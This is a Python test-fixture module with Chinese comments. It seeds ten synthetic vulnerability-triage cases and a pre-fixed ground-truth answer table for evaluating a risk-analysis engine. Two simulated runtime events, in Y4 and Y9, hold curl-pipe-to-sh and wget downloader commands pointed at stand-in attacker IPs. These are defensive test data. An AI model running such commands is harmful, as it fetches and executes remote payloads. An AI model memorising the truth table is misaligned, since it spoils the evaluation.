"""Stage 9B M4.2：独立研判案例集 Y1–Y10（Fixture + 先验固定真值表）。

设计纪律（任务书第六部分）：
- 十类场景全部为通用安全语义构造，与既有 E1–E5/X1–X3 Fixture 同库隔离、
  同合成规范（CVE-2026-810xx、TEST-NET/RFC5737 地址、无真实凭据）；
- 每个案例使用**独占包名**（不出现在任何其他 Fixture 资产上），确保一 CVE 一
  事件、不与 E/X 资产交叉匹配（隔离性由构建后断言核对）；
- 真值表（Y_TRUTH）在模型运行前固定并随本文件入库，先于任何实验数据提交；
  不得使用测试结果反向调整标签（诚实性约束，与 E/X 真值同一纪律）；
- 评价标准与 E/X 一致：impact/direction/action/needs_human/runtime_expect
  （允许集语义，不是单点匹配）。

十类覆盖（任务书原文对应）：
  Y1  不同版本分支及厂商补丁回移植（上游 affected 但厂商已 backport → 不受影响）
  Y2  NVD 候选命中但厂商明确不受影响（装机低于受影响区间下界）
  Y3  组件安装但漏洞触发条件不满足（无活跃监听/无相关进程 → 不得 immediate）
  Y4  组件未确认而存在无关可疑运行时事件（不得把异常解释为该 CVE 利用）
  Y5  漏洞严重但动态监控缺失（无传感器/无事件 → 不得解释为不受影响）
  Y6  可信静态证据、缺动态证据也需及时处置（KEV+公网 Critical → immediate 合法）
  Y7  厂商公告与第三方情报冲突（affected vs not_affected → 冲突显式化+人工）
  Y8  OpenWrt 终端数据采集能力限制（无 eBPF 证据源 → 不影响适用性判断）
  Y9  动态证据充足但与候选 CVE 缺乏直接关联（活跃≠利用，不得升紧迫度）
  Y10 已采取缓解措施但补丁尚未安装（缓解≠修复，不得判 not_affected）

构建次序说明（Y1/Y2 的关键）：
- 匹配引擎对 canonical not_affected 直接产出非受影响 match（无风险事件可评审）。
  Y1/Y2 的考察点是「规则候选已命中后，研判层能否识别厂商精确事实」——因此
  canonical not_affected 记录在 run_matching **之后**登记：匹配先按版本口径
  命中（potentially_affected），风险事件就位；分析时 evidence_prep/分析师工具
  实时读取多源包，能看到厂商 not_affected 事实并正确压制误报候选。
- Y4（清单不完整资产）的「未确认组件」match 为手工登记（run_matching 之后），
  模拟扫描器服务横幅识别出的候选（包清单不完整、装机版本未知）。
"""
from __future__ import annotations

import json
from datetime import datetime, timedelta, timezone

Y_CASE_ORDER = [f"CVE-2026-810{index}" for index in range(10, 20)]

# ── 先验真值表（运行前固定；允许集语义；needs_human=None 表示人工/自动皆可） ──
Y_TRUTH = {
    # Y1：厂商 backport——上游 3.8.x 受影响、jammy 已把修复回移植进 3.7.3-4ubuntu1.4；
    # NVD 通用候选仍按上游口径命中（装机 3.7.3 < 上游修复 3.8.9 → 假阳性）。
    # 核心验收：厂商精确公告（release 作用域）优先于上游版本比较。
    "CVE-2026-81010": {
        "label": "Y1 厂商补丁 backport（上游口径 affected 但 jammy 已回移植修复）",
        "impact": {"not_affected", "insufficient_evidence"},
        "directions": {"maintain", "downgrade_minor", "downgrade_major"},
        "actions": {"monitor", "defer", "collect_more_evidence"},
        "needs_human": None,
        "runtime_expect": None,
        "acceptance": "不得因 NVD 通用候选/上游版本比较推翻厂商 backport 事实",
    },
    # Y2：NVD 候选命中（版本口径）但厂商明确 not_affected——装机 2.6.8 低于
    # 受影响区间下界 2.7.0。核心验收：区间语义（低于下界同样不受影响）。
    "CVE-2026-81011": {
        "label": "Y2 NVD 候选命中但厂商明确不受影响（装机低于受影响区间下界）",
        "impact": {"not_affected", "insufficient_evidence"},
        "directions": {"maintain", "downgrade_minor", "downgrade_major"},
        "actions": {"monitor", "defer", "collect_more_evidence"},
        "needs_human": None,
        "runtime_expect": None,
        "acceptance": "装机版本低于受影响区间下界 → 不受影响；区间语义独立于 fixed_version",
    },
    # Y3：组件已装且版本受影响（适用性成立），但漏洞触发条件（服务活跃监听）
    # 不满足——无 apache2 服务条目、无相关进程。核心验收：适用性成立但紧迫度
    # 不得升级（无攻击前置条件）；不得 immediate_fix。
    "CVE-2026-81012": {
        "label": "Y3 组件安装但漏洞触发条件不满足（无活跃监听）",
        "impact": {"confirmed_affected", "potentially_affected"},
        "directions": {"maintain", "downgrade_minor"},
        "actions": {"scheduled_fix", "monitor", "collect_more_evidence"},
        "needs_human": None,
        "runtime_expect": None,
        "acceptance": "触发条件不满足 → 不得 immediate_fix；适用性仍成立（不得 not_affected）",
    },
    # Y4：清单不完整资产上包未列出（组件未确认）+ 与该包无关的可疑运行时事件。
    # 核心验收：impact=insufficient_evidence；可疑事件不得解释为该 CVE 利用证据、
    # 不得据此升级本风险方向。
    "CVE-2026-81013": {
        "label": "Y4 组件未确认而存在无关可疑运行时事件",
        "impact": {"insufficient_evidence"},
        "directions": {"maintain", "downgrade_minor"},
        "actions": {"collect_more_evidence", "monitor"},
        "needs_human": None,
        "runtime_expect": None,
        "acceptance": "无关异常≠该 CVE 利用证据；组件未确认→insufficient（不得 not_affected）",
    },
    # Y5：Critical 静态命中（厂商 affected、装机受影响）但目标无任何运行时监控
    # （无传感器、无事件）。核心验收：监控缺失≠漏洞不存在（impact 仍受影响）；
    # 无放大因子（无 KEV、内网、无公网监听）→ 不得 immediate_fix。
    "CVE-2026-81014": {
        "label": "Y5 漏洞严重但动态监控缺失（无传感器无事件）",
        "impact": {"confirmed_affected", "potentially_affected"},
        "directions": {"maintain", "upgrade_minor"},
        "actions": {"scheduled_fix", "monitor", "collect_more_evidence"},
        "needs_human": None,
        "runtime_expect": {"unavailable", "waiting", "not_observed"},
        "acceptance": "缺少运行时事件不得解释为漏洞不存在；亦无紧迫放大因子",
    },
    # Y6：可信静态证据独立支撑及时处置——KEV + 公网监听 Critical（9.8）+ 厂商
    # affected，目标无动态监控。核心验收：静态证据充分时缺动态证据不阻断及时
    # 处置（immediate_fix+static_evidence_only 合法）；scheduled_fix 亦可接受。
    "CVE-2026-81015": {
        "label": "Y6 可信静态证据缺动态证据也需及时处置（KEV+公网 Critical）",
        "impact": {"confirmed_affected", "potentially_affected"},
        "directions": {"maintain", "upgrade_minor", "upgrade_major"},
        "actions": {"immediate_fix", "scheduled_fix"},
        "needs_human": True,   # immediate/高优先级 → 必须人工
        "runtime_expect": {"unavailable", "waiting", "not_observed"},
        "acceptance": "静态紧迫性放大因子齐备 → immediate_fix 合法（对照 E2 反例）",
    },
    # Y7：厂商公告（canonical affected，release 作用域）与第三方情报（kylin
    # not_affected）冲突。核心验收：冲突显式识别并转人工；不得静默取任一侧；
    # 处置不得在冲突未消解时直接进入修复。
    "CVE-2026-81016": {
        "label": "Y7 厂商公告与第三方情报冲突（affected vs not_affected）",
        "impact": {"confirmed_affected", "potentially_affected", "insufficient_evidence"},
        "directions": {"maintain", "upgrade_minor"},
        "actions": {"scheduled_fix", "monitor", "collect_more_evidence", "mitigate"},
        "needs_human": True,   # 未消解冲突 → 必须人工
        "runtime_expect": None,
        "acceptance": "冲突必须显式化+人工；不得静默偏向任一侧",
    },
    # Y8：OpenWrt 网关（rpcd 公网）受影响，但目标无任何运行时证据源（eBPF
    # 能力受限的采集边界）。核心验收：能力受限≠不受影响（静态适用性照常判定）；
    # 亦不得据此提升紧迫度（CVSS<9 → 无放大因子 → 不得 immediate）。
    "CVE-2026-81017": {
        "label": "Y8 OpenWrt 终端数据采集能力限制（无运行时证据源）",
        "impact": {"confirmed_affected", "potentially_affected"},
        "directions": {"maintain", "upgrade_minor"},
        "actions": {"scheduled_fix", "monitor", "collect_more_evidence", "mitigate"},
        "needs_human": None,
        "runtime_expect": {"unavailable", "waiting"},
        "acceptance": "采集能力受限不影响静态适用性；不得据此升降紧迫度",
    },
    # Y9：运行时证据充足且新鲜（服务活跃、无关可疑行为），但与候选 CVE 攻击
    # 模式无直接关联。核心验收：动态证据≠利用证据；不得把活跃/可疑当作该 CVE
    # 的紧迫依据（不得 immediate_fix、不得 upgrade 方向）。
    "CVE-2026-81018": {
        "label": "Y9 动态证据充足但与候选 CVE 缺乏直接关联",
        "impact": {"confirmed_affected", "potentially_affected"},
        "directions": {"maintain", "downgrade_minor"},
        "actions": {"scheduled_fix", "monitor", "collect_more_evidence"},
        "needs_human": None,
        "runtime_expect": None,
        "acceptance": "无关动态证据不得作为该 CVE 紧迫/利用依据（不得 immediate/upgrade）",
    },
    # Y10：受影响版本仍装机（适用性成立），但服务已绑定回环（缓解措施）且补丁
    # 未安装。核心验收：缓解≠修复（不得 not_affected）；紧迫度降低（不得
    # immediate_fix）；处置应含排期修复或维持缓解。
    "CVE-2026-81019": {
        "label": "Y10 已采取缓解措施但补丁尚未安装（回环绑定）",
        "impact": {"confirmed_affected", "potentially_affected"},
        "directions": {"maintain", "downgrade_minor"},
        "actions": {"scheduled_fix", "monitor", "mitigate", "collect_more_evidence"},
        "needs_human": None,
        "runtime_expect": None,
        "acceptance": "缓解≠修复（不得 not_affected）；已缓解 → 紧迫度降低",
    },
}

# 反事实对照（任务书第七部分）：Y6 去除 KEV 后，静态紧迫性失去放大因子——
# 预期 immediate_fix 不再合法（降级 scheduled_fix）。与 Y6 主运行构成同一
# 案例的干预对照，验证 urgency_amplifiers 机制真实驱动决策（而非偶然）。
#
# ⚠ SUPERSEDED（M4.2 收尾轮修正，修正原因见 stage9b_closure_cases.py 文件头）：
# 本设计只去除 KEV，未同时去除「受影响组件公网监听 × CVSS≥9.0」通道——Y6 的
# caddy 0.0.0.0:443 × CVSS 9.8 在 kev=False 下放大因子仍成立，「去 KEV 必降
# scheduled_fix」的预期不成立。收尾轮改用完整 2×2 条件组合
# （stage9b_closure_cases.Y6_CF2_TRUTH），本表仅作历史设计记录保留，不再用于
# 新实验判定。
Y6_COUNTERFACTUAL_CVE = "CVE-2026-81015"
Y6_COUNTERFACTUAL_TRUTH = {
    "impact": {"confirmed_affected", "potentially_affected"},
    "directions": {"maintain", "upgrade_minor"},
    "actions": {"scheduled_fix", "monitor", "collect_more_evidence"},
    "needs_human": None,
    "label": "CF-Y6 去除 KEV 的反事实（放大因子消失 → 不得 immediate_fix）",
    "acceptance": "KEV 是 static_evidence_only 的确定性放大因子；去除后紧迫度上限 scheduled_fix",
}


def extend_fixture_for_y_cases(db, *, y6_kev: bool = True) -> None:
    """在 E/X Fixture 之上追加 Y1–Y10 独立案例（同库隔离）。

    y6_kev=False 构建反事实库（Y6 去除 KEV），其余案例不变。
    """
    from app import models
    from app.services.vulnerability_intelligence.service import upsert_source_record
    from app.services.security_evidence import persist_evidence
    from app.services.matching_engine import run_matching
    from app.services.risk_engine import calculate_risk

    now = datetime.now(timezone.utc)
    recent = (now - timedelta(minutes=35)).isoformat()
    all_y_events: list[dict] = []

    def asset(hostname, ip, **kwargs):
        row = models.LinuxAsset(hostname=hostname, ip_address=ip, distribution="ubuntu",
                                os_version="22.04", os_name="Ubuntu", device_type="server",
                                inventory_complete=kwargs.pop("inventory_complete", True),
                                **kwargs)
        db.add(row)
        db.flush()
        return row

    def packages(target, rows):
        for name, version in rows:
            db.add(models.AssetPackage(asset_id=target.id, package_name=name,
                                       package_version=version, package_manager="apt"))

    def services(target, rows):
        for name, port, listen, public, proc in rows:
            db.add(models.AssetService(asset_id=target.id, service_name=name, port=port,
                                       protocol="tcp", listen_address=listen,
                                       is_public_exposed=public, process_name=proc))

    def vuln(cve, title, package, fixed, cvss, severity, description, **kwargs):
        db.add(models.VulnerabilityInfo(
            cve_id=cve, title=title, description=description, cvss_score=cvss,
            cvss_severity=severity, affected_package=package, fixed_version=fixed,
            source=kwargs.pop("source", "fixture"),
            published_date="2026-09-25", last_modified_date="2026-10-05"))

    def intel(cve, kev, epss, pct):
        db.add(models.ThreatIntelSource(
            cve_id=cve, is_kev=kev, epss_score=epss, epss_percentile=pct,
            exploit_status="known-exploited" if kev else "none"))

    def sources(cve, canonical=None, nvd=None, kev=None, epss=None, kylin=None):
        if canonical is not None:
            upsert_source_record(db, cve, "canonical", canonical,
                                 source_updated_at="2026-10-05T00:00:00Z")
        if nvd is not None:
            upsert_source_record(db, cve, "nvd", nvd,
                                 source_updated_at="2026-10-05T00:00:00Z")
        if kev is not None:
            upsert_source_record(db, cve, "cisa_kev", kev,
                                 source_updated_at="2026-10-06T00:00:00Z")
        if epss is not None:
            upsert_source_record(db, cve, "epss", epss,
                                 source_updated_at="2026-10-06T00:00:00Z")
        if kylin is not None:
            upsert_source_record(db, cve, "kylin", kylin,
                                 source_updated_at="2026-10-06T00:00:00Z")

    def runtime_events(rows):
        for item in rows:
            db.add(models.RuntimeEvent(
                asset_id=item["asset_id"], hostname=item["hostname"], source=item["source"],
                event_type=item["event_type"], category=item["category"],
                severity=item["severity"], severity_score=item["severity_score"],
                rule=item["rule"], process_name=item["process_name"],
                parent_process=item["parent_process"], commandline=item["commandline"],
                file_path=item.get("file_path", ""), destination=item.get("destination", ""),
                port=item.get("port", 0), risk_signal=item["rule"],
                raw_json=json.dumps({"fixture": True}), occurred_at=item["ts"],
                process_id=item["pid"], parent_process_id=item["ppid"],
                process_exec_id=f"exec-{item['hostname']}-{item['pid']}-{abs(hash(item['commandline'])) % 99999}",
                parent_exec_id=f"exec-{item['hostname']}-{item['ppid']}" if item["ppid"] else "",
                sensor_id=item["sensor_id"], event_fingerprint=f"fp-y-{abs(hash(str(item))) % 10**18}",
            ))
            all_y_events.append(item)

    def sensor(target, sensor_id, *, heartbeat=None, dropped=0, source="falco"):
        db.add(models.RuntimeSensor(
            asset_id=target.id, sensor_id=sensor_id, source=source, status="running",
            last_heartbeat_at=heartbeat or now, dropped_events=dropped,
            capabilities_json=json.dumps({"metrics": "dropped_events"}), detail="fixture-y"))

    def ev(hostname, target, category, event_type, process, parent, cmdline, *,
           dest="", port=0, file_path="", sev="info", score=0, ts=None, pid=0, ppid=0,
           rule="", sensor_id=""):
        # timestamp 与 ts 同值双键（收尾轮脚手架修复）：persist_evidence 取
        # event["timestamp"] 写入证据层，缺该键会让 Y 案例证据层时间戳为空
        # （RuntimeEvent.occurred_at 一直正确；已记录的 Y 运行无任何真值依赖
        # freshness，结论不受影响；修复仅影响未来重跑的证据 ID 哈希）。
        recent_ts = ts or recent
        return {"hostname": hostname, "asset_id": target.id, "source": "falco",
                "event_type": event_type, "category": category, "severity": sev,
                "severity_score": score, "rule": rule, "process_name": process,
                "parent_process": parent, "commandline": cmdline, "file_path": file_path,
                "destination": dest, "port": port, "ts": recent_ts,
                "timestamp": recent_ts, "pid": pid,
                "ppid": ppid, "sensor_id": sensor_id or f"sensor-{hostname}"}

    # ── Y1（CVE-2026-81010）：厂商 backport（gnutls28，独占包） ──
    y1 = asset("edge-10", "192.0.2.30", exposure_level="internal", business_level="normal")
    packages(y1, [("gnutls28", "3.7.3-4ubuntu1.4")])
    services(y1, [("ssh", 22, "192.0.2.30", False, "sshd")])
    # 上游修复口径 3.8.9（版本比较将判「装机<修复」——这正是 backport 陷阱）
    vuln("CVE-2026-81010:jammy", "gnutls28 record parsing crash (fixture)", "gnutls28",
         "3.8.9", 7.5, "High",
         "Fixture synthetic advisory: crash parsing crafted TLS records in gnutls.")
    intel("CVE-2026-81010:jammy", False, 0.2, 0.5)
    sources("CVE-2026-81010",
            nvd={"cvss": {"score": 7.5, "severity": "High",
                          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"},
                 "description": "Crash parsing crafted TLS records. Upstream affected "
                                 "versions: 3.8.0 before 3.8.9. (fixture)",
                 "cwe": ["CWE-476"], "cpe_status": "affected"},
            epss={"score": 0.2, "percentile": 0.5})
    runtime_events([ev("edge-10", y1, "process_execution", "execve", "sshd", "systemd",
                       "sshd: session", pid=4100, ppid=4000)])
    sensor(y1, "sensor-edge-10")
    # canonical not_affected（backport）在 run_matching 之后登记（见文件头说明）
    y1_canonical = {"records": [{"release": "jammy", "package": "gnutls28",
                                 "status": "not_affected", "priority": "negligible",
                                 "note": "Fix was backported to 3.7.3-4ubuntu1.4 in jammy; "
                                         "the 3.7.x release branch is not affected."}]}

    # ── Y2（CVE-2026-81011）：NVD 候选 vs 厂商明确 not_affected（低于区间下界） ──
    y2 = asset("edge-11", "192.0.2.31", exposure_level="internal", business_level="normal")
    packages(y2, [("haproxy", "2.6.8-1")])
    services(y2, [("ssh", 22, "192.0.2.31", False, "sshd")])
    vuln("CVE-2026-81011:jammy", "haproxy header parsing flaw (fixture)", "haproxy",
         "2.7.3-1", 7.4, "High",
         "Fixture synthetic advisory: malformed header handling in haproxy 2.7 line.")
    intel("CVE-2026-81011:jammy", False, 0.15, 0.4)
    sources("CVE-2026-81011",
            nvd={"cvss": {"score": 7.4, "severity": "High",
                          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"},
                 "description": "Malformed header handling. Affected versions: 2.7.0 before "
                                "2.7.3 only. (fixture)",
                 "cwe": ["CWE-444"], "cpe_status": "affected"},
            epss={"score": 0.15, "percentile": 0.4})
    runtime_events([ev("edge-11", y2, "process_execution", "execve", "sshd", "systemd",
                       "sshd: session", pid=4101, ppid=4001)])
    sensor(y2, "sensor-edge-11")
    y2_canonical = {"records": [{"release": "jammy", "package": "haproxy",
                                 "status": "not_affected", "priority": "negligible",
                                 "note": "jammy ships 2.6.8, which predates the affected "
                                         "2.7.x line; not affected."}]}

    # ── Y3（CVE-2026-81012）：组件安装但触发条件不满足（apache2 无监听） ──
    y3 = asset("edge-12", "192.0.2.32", exposure_level="internal", business_level="normal")
    packages(y3, [("apache2", "2.4.52-1ubuntu4.4")])   # 版本受影响（修复 4.9）
    services(y3, [("ssh", 22, "192.0.2.32", False, "sshd")])   # 无 apache2 监听
    vuln("CVE-2026-81012:jammy", "apache2 HTTP/2 CONTINUATION flood (fixture)", "apache2",
         "2.4.52-1ubuntu4.9", 8.8, "High",
         "Fixture synthetic advisory: amplification via HTTP/2 CONTINUATION frames "
         "against an active listener.")
    intel("CVE-2026-81012:jammy", False, 0.25, 0.6)
    sources("CVE-2026-81012",
            canonical={"records": [{"release": "jammy", "package": "apache2",
                                    "status": "affected",
                                    "fixed_version": "2.4.52-1ubuntu4.9",
                                    "priority": "high"}]},
            nvd={"cvss": {"score": 8.8, "severity": "High",
                          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"},
                 "description": "HTTP/2 CONTINUATION flood against active listener (fixture).",
                 "cwe": ["CWE-400"], "cpe_status": "affected"},
            epss={"score": 0.25, "percentile": 0.6})
    runtime_events([ev("edge-12", y3, "process_execution", "execve", "sshd", "systemd",
                       "sshd: session", pid=4102, ppid=4002)])
    sensor(y3, "sensor-edge-12")

    # ── Y4（CVE-2026-81013）：组件未确认 + 无关可疑运行时事件（gnupg，独占包） ──
    y4 = asset("edge-13", "192.0.2.33", exposure_level="internal", business_level="normal",
               inventory_complete=False)
    packages(y4, [("bash", "5.1-6ubuntu1")])   # gnupg 未在清单（清单不完整）
    services(y4, [("ssh", 22, "192.0.2.33", False, "sshd")])
    vuln("CVE-2026-81013:jammy", "gnupg signature parse overflow (fixture)", "gnupg",
         "2.2.27-3ubuntu1.4", 8.1, "High",
         "Fixture synthetic advisory: overflow parsing crafted OpenPGP signatures.")
    intel("CVE-2026-81013:jammy", False, 0.2, 0.5)
    sources("CVE-2026-81013",
            nvd={"cvss": {"score": 8.1, "severity": "High",
                          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"},
                 "description": "Overflow parsing crafted OpenPGP signatures (fixture).",
                 "cwe": ["CWE-120"], "cpe_status": "affected"},
            epss={"score": 0.2, "percentile": 0.5})
    # 无关可疑事件：bash 下载器链（与 gnupg 无关）+ 正常 sshd
    runtime_events([
        ev("edge-13", y4, "process_execution", "execve", "bash", "sshd",
           "bash -c curl -s http://198.51.100.77/p.sh | sh", pid=4103, ppid=4003,
           sev="warning", score=64, rule="service_shell_spawn"),
        ev("edge-13", y4, "network_activity", "connect", "curl", "bash",
           "curl -s http://198.51.100.77/p.sh", dest="198.51.100.77:80", port=80,
           pid=4104, ppid=4103, sev="warning", score=58, rule="downloader_execution"),
        ev("edge-13", y4, "process_execution", "execve", "sshd", "systemd",
           "sshd: session", pid=4003, ppid=3999),
    ])
    sensor(y4, "sensor-edge-13")
    # 「未确认组件」候选为 run_matching 之后手工登记（扫描器服务横幅识别语义）

    # ── Y5（CVE-2026-81014）：严重漏洞 + 动态监控完全缺失（libgcrypt20） ──
    y5 = asset("edge-14", "192.0.2.34", exposure_level="internal", business_level="normal")
    packages(y5, [("libgcrypt20", "1.9.4-1")])
    services(y5, [("ssh", 22, "192.0.2.34", False, "sshd")])
    vuln("CVE-2026-81014:jammy", "libgcrypt20 ElGamal parameter overflow (fixture)",
         "libgcrypt20", "1.9.4-1ubuntu1.2", 9.1, "Critical",
         "Fixture synthetic advisory: overflow computing ElGamal parameters with "
         "crafted key material.")
    intel("CVE-2026-81014:jammy", False, 0.3, 0.7)
    sources("CVE-2026-81014",
            canonical={"records": [{"release": "jammy", "package": "libgcrypt20",
                                    "status": "affected",
                                    "fixed_version": "1.9.4-1ubuntu1.2",
                                    "priority": "high"}]},
            nvd={"cvss": {"score": 9.1, "severity": "Critical",
                          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"},
                 "description": "Overflow computing ElGamal parameters (fixture).",
                 "cwe": ["CWE-190"], "cpe_status": "affected"},
            epss={"score": 0.3, "percentile": 0.7})
    # 无 sensor、无 RuntimeEvent：动态监控完全缺失（预期运行时 unavailable/waiting）

    # ── Y6（CVE-2026-81015）：可信静态证据 → 及时处置（caddy 公网，独占包） ──
    y6 = asset("edge-15", "192.0.2.35", exposure_level="public", business_level="core")
    packages(y6, [("caddy", "2.6.4-1")])
    services(y6, [("caddy", 443, "0.0.0.0", True, "caddy"),
                  ("ssh", 22, "192.0.2.35", True, "sshd")])
    vuln("CVE-2026-81015:jammy", "caddy unauthenticated remote code execution (fixture)",
         "caddy", "2.6.4-2", 9.8, "Critical",
         "Fixture synthetic advisory: unauthenticated RCE via crafted chunked encoding.")
    intel("CVE-2026-81015:jammy", y6_kev, 0.92, 0.99)
    sources("CVE-2026-81015",
            canonical={"records": [{"release": "jammy", "package": "caddy",
                                    "status": "affected", "fixed_version": "2.6.4-2",
                                    "priority": "critical"}]},
            nvd={"cvss": {"score": 9.8, "severity": "Critical",
                          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
                 "description": "Unauthenticated RCE via chunked encoding (fixture).",
                 "cwe": ["CWE-94"], "cpe_status": "affected"},
            kev=({"is_kev": True, "date_added": "2026-10-02", "due_date": "2026-10-23"}
                 if y6_kev else None),
            epss={"score": 0.92, "percentile": 0.99})
    # 公网核心资产但监控缺位（无 sensor/无事件）：静态证据独立支撑紧迫性

    # ── Y7（CVE-2026-81016）：厂商 affected vs 第三方 kylin not_affected（libnss3） ──
    y7 = asset("edge-16", "192.0.2.36", exposure_level="internal", business_level="important")
    packages(y7, [("libnss3", "3.68.2-0ubuntu1")])
    services(y7, [("ssh", 22, "192.0.2.36", False, "sshd")])
    vuln("CVE-2026-81016:jammy", "libnss3 CMS decode use-after-free (fixture)", "libnss3",
         "3.68.2-0ubuntu1.3", 8.6, "High",
         "Fixture synthetic advisory: use-after-free decoding crafted CMS structures.")
    intel("CVE-2026-81016:jammy", False, 0.35, 0.75)
    sources("CVE-2026-81016",
            canonical={"records": [{"release": "jammy", "package": "libnss3",
                                    "status": "affected",
                                    "fixed_version": "3.68.2-0ubuntu1.3",
                                    "priority": "high"}]},
            nvd={"cvss": {"score": 8.6, "severity": "High",
                          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"},
                 "description": "Use-after-free decoding crafted CMS structures (fixture).",
                 "cwe": ["CWE-416"], "cpe_status": "affected"},
            kylin={"cpe_status": "not_affected",
                   "description": "Kylin analysis: the affected code path is not reachable in "
                                  "these builds; assessed not affected (fixture)."},
            epss={"score": 0.35, "percentile": 0.75})
    runtime_events([ev("edge-16", y7, "process_execution", "execve", "sshd", "systemd",
                       "sshd: session", pid=4105, ppid=4005)])
    sensor(y7, "sensor-edge-16")

    # ── Y8（CVE-2026-81017）：OpenWrt 采集能力限制（rpcd，wrt2-node 独占） ──
    y8 = models.LinuxAsset(
        hostname="wrt2-node", ip_address="192.0.2.28", distribution="openwrt",
        os_version="23.05.4", os_name="OpenWrt", exposure_level="dmz",
        business_level="important", device_type="gateway", device_model="generic-x86-64",
        inventory_complete=True)
    db.add(y8)
    db.flush()
    packages(y8, [("rpcd", "2023.03-1")])
    services(y8, [("uhttpd", 80, "192.0.2.28", True, "uhttpd"),
                  ("dropbear", 22, "192.0.2.28", True, "dropbear")])
    db.add(models.VulnerabilityInfo(
        cve_id="CVE-2026-81017", title="rpcd ubus ACL bypass (fixture)",
        description="Fixture synthetic advisory: ubus ACL bypass in rpcd session "
                    "handling.", cvss_score=8.2, cvss_severity="High",
        affected_package="rpcd", fixed_version="2023.03-2",
        source="openwrt_operator_advisory", published_date="2026-09-28",
        last_modified_date="2026-10-05"))
    db.add(models.ThreatIntelSource(cve_id="CVE-2026-81017", is_kev=False,
                                    epss_score=0.28, epss_percentile=0.62,
                                    exploit_status="none"))
    db.flush()
    db.add(models.OpenWrtAdvisory(
        cve_id="CVE-2026-81017", package_name="rpcd", release="23.05.4",
        source_url="https://fixtures.invalid/openwrt-advisory-81017",
        affected_versions_json=json.dumps(["2023.03-1"]),
        fixed_versions_json=json.dumps(["2023.03-2"]),
        notes="Operator-registered from official advisory; applies to release 23.05.x."))
    db.flush()
    # 无 eBPF 证据源（OpenWrt 采集边界）：不写 RuntimeEvent/SecurityEvidence/sensor

    # ── Y9（CVE-2026-81018）：动态证据充足但与候选 CVE 无直接关联（polkit） ──
    y9 = asset("edge-18", "192.0.2.38", exposure_level="internal", business_level="normal")
    packages(y9, [("polkit", "0.105-26")])
    services(y9, [("ssh", 22, "192.0.2.38", False, "sshd"),
                  ("dbus", 0, "192.0.2.38", False, "dbus-daemon")])
    vuln("CVE-2026-81018:jammy", "polkit local privilege escalation (fixture)", "polkit",
         "0.105-33", 7.8, "High",
         "Fixture synthetic advisory: pkexec path handling allows local privilege "
         "escalation on systems where polkit is installed.")
    intel("CVE-2026-81018:jammy", False, 0.4, 0.8)
    sources("CVE-2026-81018",
            canonical={"records": [{"release": "jammy", "package": "polkit",
                                    "status": "affected", "fixed_version": "0.105-33",
                                    "priority": "medium"}]},
            nvd={"cvss": {"score": 7.8, "severity": "High",
                          "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"},
                 "description": "pkexec local privilege escalation (fixture).",
                 "cwe": ["CWE-78"], "cpe_status": "affected"},
            epss={"score": 0.4, "percentile": 0.8})
    runtime_events([
        # polkitd 正常守护活动（组件存在/服务活跃——不是利用证据）
        ev("edge-18", y9, "process_execution", "execve", "polkitd", "systemd",
           "/usr/lib/polkit-1/polkitd --no-debug", pid=4106, ppid=3006),
        ev("edge-18", y9, "process_execution", "execve", "dbus-daemon", "systemd",
           "dbus-daemon --system", pid=4107, ppid=3007),
        # 无关可疑：apache2 子进程 shell + 外联（与 polkit 利用模式无关）
        ev("edge-18", y9, "process_execution", "execve", "sh", "apache2",
           "sh -c wget -qO /tmp/y9 http://198.51.100.88/y9.bin", pid=4108, ppid=3108,
           sev="warning", score=60, rule="service_shell_spawn"),
        ev("edge-18", y9, "network_activity", "connect", "wget", "sh",
           "wget -qO /tmp/y9 http://198.51.100.88/y9.bin", dest="198.51.100.88:80",
           port=80, pid=4109, ppid=4108, sev="warning", score=55),
    ])
    sensor(y9, "sensor-edge-18")

    # ── Y10（CVE-2026-81019）：已缓解（回环绑定）但补丁未安装（memcached） ──
    y10 = asset("edge-19", "192.0.2.39", exposure_level="internal", business_level="important")
    packages(y10, [("memcached", "1.6.14-1")])   # 仍是受影响版本（补丁未装）
    services(y10, [("memcached", 11211, "127.0.0.1", False, "memcached"),   # 缓解：仅回环
                   ("ssh", 22, "192.0.2.39", False, "sshd")])
    vuln("CVE-2026-81019:jammy", "memcached crafted key overflow (fixture)", "memcached",
         "1.6.15-1", 9.0, "Critical",
         "Fixture synthetic advisory: overflow storing crafted keys; reachable via "
         "network-facing memcached listeners.")
    intel("CVE-2026-81019:jammy", False, 0.3, 0.65)
    sources("CVE-2026-81019",
            canonical={"records": [{"release": "jammy", "package": "memcached",
                                    "status": "affected", "fixed_version": "1.6.15-1",
                                    "priority": "high"}]},
            nvd={"cvss": {"score": 9.0, "severity": "Critical",
                          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"},
                 "description": "Overflow storing crafted keys via network listeners (fixture).",
                 "cwe": ["CWE-190"], "cpe_status": "affected"},
            epss={"score": 0.3, "percentile": 0.65})
    runtime_events([
        ev("edge-19", y10, "process_execution", "execve", "memcached", "systemd",
           "/usr/bin/memcached -m 64 -p 11211 -l 127.0.0.1", pid=4110, ppid=3010),
        ev("edge-19", y10, "network_activity", "connect", "memcached", "systemd",
           "memcached: worker process", dest="127.0.0.1:11211", port=11211,
           pid=4111, ppid=4110),
    ])
    sensor(y10, "sensor-edge-19")

    db.flush()
    # SecurityEvidence 统一持久化（与 E/X 相同语义：经真实 persist_evidence 摄取）
    persist_evidence(db, all_y_events)

    # 匹配（此时 Y1/Y2 尚无 canonical 记录 → 按版本口径命中候选）
    run_matching(db)

    # ── 匹配后置事实登记（见文件头说明） ──
    upsert_source_record(db, "CVE-2026-81010", "canonical", y1_canonical,
                         source_updated_at="2026-10-07T00:00:00Z")
    upsert_source_record(db, "CVE-2026-81011", "canonical", y2_canonical,
                         source_updated_at="2026-10-07T00:00:00Z")
    # Y4：清单不完整资产上的「未确认组件」候选（扫描器横幅识别语义）。
